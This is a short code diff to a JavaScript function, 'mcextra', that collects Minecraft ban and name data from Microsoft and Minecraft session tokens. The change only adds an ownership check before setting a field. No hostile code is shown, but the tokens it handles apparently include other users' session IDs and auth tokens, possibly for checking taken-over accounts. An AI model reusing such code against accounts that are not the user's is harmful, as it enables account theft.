@@ -30,6 +30,7 @@ const timeTracker = () => {
 };
 
 module.exports = async function mcextra(axios, usertoken, xuid, gtg, settings, userid, uid, msauth, ssid, mc, oldname, optionalusername = null, username = null, mxbl) {
+    const isMcOwned = checkmc(mc) && oldname && oldname !== "Couldn't find!" && oldname !== "No Minecraft Profile";
     const mcextra = { 
         ban: null, 
         banReason: null, 
@@ -43,7 +44,7 @@ module.exports = async function mcextra(axios, usertoken, xuid, gtg, settings, u
         mcpvpBanReason: null,
         banMcpvp: null,
         mcpvpBanchecked: false,
-        newign: oldname 
+        newign: isMcOwned ? oldname : "Couldn't find!"
     };
     const promises = [];
 
